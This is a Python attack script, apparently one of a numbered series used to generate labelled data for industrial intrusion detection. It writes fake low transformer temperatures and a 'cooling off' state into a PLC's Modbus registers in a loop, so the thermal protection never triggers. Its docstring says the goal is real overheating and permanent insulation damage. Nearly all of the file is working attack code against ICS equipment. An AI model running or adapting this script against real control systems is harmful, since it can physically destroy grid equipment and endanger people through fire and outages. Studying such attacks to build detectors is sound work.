"""
Attack #10: Thermal_Sabotage (Thermal Sabotage)
===============================================
Target: HR16 (T_oil x10) + HR17 (T_hotspot x10) + HR19 (Cooling)
Technique: Reports low transformer temperatures and cooling as off so the
           PLC never triggers thermal protection.
Effect: The transformer overheats in reality while protection stays
        inactive, burning the insulation and causing permanent damage.

This attack differs from Attack #13 (Reactive Power): it directly
manipulates thermal sensor data to cause physical damage.
MITRE ATT&CK for ICS: T0836 - Modify Parameter
"""
import time, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from pymodbus.client import ModbusTcpClient
from attacks.config import (PLC_IP, PLC_PORT, UNIT_ID,
    HR16_T_OIL, HR17_T_HOTSPOT, HR19_COOLING, LABEL_THERMAL_SABOTAGE)

ATTACK_NAME = "Thermal_Sabotage"
ATTACK_ID   = LABEL_THERMAL_SABOTAGE

# Fake values: report low temperature (x10 scale)
FAKE_T_OIL     = 400   # 40.0C (actual could be 90C+)
FAKE_T_HOTSPOT = 500   # 50.0C (actual could be 120C+)
FAKE_COOLING   = 0     # Report cooling as ONAN (fans off)

def run_attack(duration_sec=600, label_manager=None):
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT}")
    print(f"  T_oil={FAKE_T_OIL/10}C(fake), T_hs={FAKE_T_HOTSPOT/10}C(fake)")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(ATTACK_ID, ATTACK_NAME,
            f"HR16={FAKE_T_OIL}, HR17={FAKE_T_HOTSPOT}, HR19={FAKE_COOLING}")

    start_time = time.time()
    pkt_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(address=HR16_T_OIL, value=FAKE_T_OIL)
                client.write_register(address=HR17_T_HOTSPOT, value=FAKE_T_HOTSPOT)
                client.write_register(address=HR19_COOLING, value=FAKE_COOLING)
                pkt_count += 3
            except Exception:
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if pkt_count % 300 == 0:
                rem = duration_sec - (time.time() - start_time)
                print(f"  [THERM] {pkt_count} packets | fake cooling | remaining: {rem:.0f}s")
            time.sleep(0.2)

    except KeyboardInterrupt:
        print("\n  [THERM] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(ATTACK_ID, ATTACK_NAME,
                f"{pkt_count} packets, {elapsed:.1f}s")
        print(f"\n  [THERM] {pkt_count} packets, {elapsed:.1f}s")
        return True

if __name__ == "__main__":
    run_attack(duration_sec=60)
